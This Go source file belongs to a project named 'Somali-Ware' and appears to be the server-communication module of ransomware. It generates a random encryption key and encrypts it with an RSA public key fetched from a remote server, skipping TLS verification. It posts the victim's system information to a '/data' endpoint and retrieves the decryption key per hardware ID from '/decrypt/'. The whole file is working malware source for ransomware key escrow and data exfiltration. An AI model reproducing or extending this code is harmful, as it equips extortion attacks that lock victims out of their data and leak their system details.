package server

import (
	"Somali-Ware/modules/structs"
	"Somali-Ware/settings"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net/http"
	"time"
)

func GenerateKey() error {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		return fmt.Errorf("failed to generate key: %w", err)
	}

	settings.Key = key

	rsa_key, err := GetRSAPublicKey()
	if err != nil {
		return fmt.Errorf("failed to get RSA public key: %w", err)
	}

	encrypted_key, err := EncryptGeneratedKey(key, rsa_key)
	if err != nil {
		return fmt.Errorf("failed to encrypt key: %w", err)
	}

	encrypted_key_base64 := base64.StdEncoding.EncodeToString(encrypted_key)
	settings.EncryptedKey = encrypted_key_base64

	return nil
}

func GetRSAPublicKey() ([]byte, error) {
	httpClient := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := httpClient.Get(settings.URL + "/pkey")
	if err != nil {
		return nil, fmt.Errorf("failed to get RSA public key: %w", err)
	}
	defer resp.Body.Close()

	jsonResponse := struct {
		Key string `json:"key"`
	}{}

	err = json.NewDecoder(resp.Body).Decode(&jsonResponse)
	if err != nil {
		return nil, fmt.Errorf("failed to decode json response: %w", err)
	}

	key := []byte(jsonResponse.Key)

	return key, nil
}

func EncryptGeneratedKey(key []byte, rsaPublicKey []byte) ([]byte, error) {
	block, _ := pem.Decode(rsaPublicKey)
	if block == nil {
		return nil, fmt.Errorf("failed to decode RSA public key")
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse RSA public key: %w", err)
	}

	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("failed to convert public key to RSA public key")
	}

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, key, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt key: %w", err)
	}

	return encryptedKey, nil
}

func SendSystemData(data structs.SystemInfo) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("failed to marshal system data")
		return
	}

	httpClient := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := httpClient.Post(settings.URL+"/data", "application/json", bytes.NewReader(jsonData))
	if err != nil {
		fmt.Println("failed to send system data")
		return
	}
	defer resp.Body.Close()
}

func CheckAginstHWID(hwid string) (string, error) {
	httpClient := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := httpClient.Get(settings.URL + "/decrypt/" + hwid)
	if err != nil {
		fmt.Println("failed to check hwid")
		return "", err
	}
	defer resp.Body.Close()

	jsonResponse := struct {
		Key string `json:"key"`
	}{}

	err = json.NewDecoder(resp.Body).Decode(&jsonResponse)
	if err != nil {
		fmt.Println("failed to decode json response")
		return "", err
	}

	return jsonResponse.Key, nil
}
